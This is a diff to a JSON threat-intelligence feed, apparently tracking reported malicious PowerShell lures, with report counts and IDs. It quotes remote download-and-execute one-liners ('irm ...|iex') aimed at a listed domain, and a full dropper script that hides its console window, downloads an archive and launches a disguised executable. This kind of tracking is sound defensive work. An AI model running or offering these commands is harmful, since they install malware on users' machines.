@@ -1,13 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 161,
-    "ReportCount": 161,
-    "FirstSeen": "2026-11-10T10:57:58.511000+00:00",
+    "DistinctPayloadCount": 159,
+    "ReportCount": 159,
+    "FirstSeen": "2026-11-10T11:17:30.993000+00:00",
     "LastSeen": "2026-11-17T10:23:18.552000+00:00",
     "ReportIds": [
-      "cmwaktkno00240omll6ytk474",
-      "cmwakuk2x003w0omlqpskj6p6",
       "cmwalipbz006w0oml8w01xd4l",
       "cmwao8o3p01la0omlmotcq335",
       "cmwas5id7031q0oml6ns2yux3",
@@ -301,7 +299,6 @@
       "irm 'browse-nnccodes.beer/b442615134ce6b2f'|iex;",
       "irm 'browse-nnccodes.beer/ba8264558d916670'|iex;",
       "irm 'browse-nnccodes.beer/bd2c3914f336ea48'|iex;",
-      "irm 'browse-nnccodes.beer/c136798060204bf6'|iex;",
       "irm 'browse-nnccodes.beer/c29bf32503634b69'|iex;",
       "irm 'browse-nnccodes.beer/c5cf65129f21d5ef'|iex;",
       "irm 'browse-nnccodes.beer/c5edc53c54b52bdf'|iex;",
@@ -325,7 +322,6 @@
       "irm 'browse-nnccodes.beer/e42e22c5e92d53e7'|iex;",
       "irm 'browse-nnccodes.beer/e9f8205fa9ae7342'|iex;",
       "irm 'browse-nnccodes.beer/eda44de7cd33aa18'|iex;",
-      "irm 'browse-nnccodes.beer/eeb2a4c9abf0c82b'|iex;",
       "irm 'browse-nnccodes.beer/f5e3d430790185d2'|iex;",
       "irm 'browse-nnccodes.beer/fa77de25ab2073f8'|iex;",
       "irm 'browse-nnccodes.beer/fbb6e233d74f5f77'|iex;",
@@ -800,11 +796,10 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 58,
-    "FirstSeen": "2026-11-10T10:57:24.944000+00:00",
+    "ReportCount": 57,
+    "FirstSeen": "2026-11-10T11:36:24.243000+00:00",
     "LastSeen": "2026-11-17T10:13:11.052000+00:00",
     "ReportIds": [
-      "cmwaksurb000c0omlqqpruwgo",
       "cmwam6zr200qm0omluiv0gc85",
       "cmwaqgcpt029o0omlad0xpp3o",
       "cmwaqh3zq02au0omlbcebaqu0",
